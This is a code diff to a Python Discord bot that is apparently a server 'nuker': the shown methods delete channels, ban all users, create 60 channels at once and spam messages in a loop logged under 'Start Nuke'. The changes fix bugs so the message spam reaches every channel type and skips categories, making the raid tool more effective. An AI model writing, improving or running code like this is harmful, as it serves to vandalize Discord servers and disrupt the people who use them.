@@ -34,14 +34,17 @@ class DiscordBot(commands.Bot):
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
             logs[self.logId] += "[-]Failed"
         logs[self.logId] += f" | {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
-    async def sendMessage(self, message:str, channel:discord.TextChannel, latencyMs:float):
+    async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
+        if channel in self.guild.categories:
+            self.channels.remove(channel)
+            return
         try:
             await channel.send(message)
             logs[self.logId] += "[+]Success"
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
             logs[self.logId] += "[-]Failed"
-            self.channels.pop(channel)
+            self.channels.remove(channel)
         logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
         await asyncio.sleep(latencyMs)
     async def banAllUser(self, guild:discord.Guild):
@@ -59,7 +62,7 @@ class DiscordBot(commands.Bot):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
             await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
-            self.channels = list(guild.text_channels)
+            self.channels = list(guild.channels)
             random.shuffle(self.channels)
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
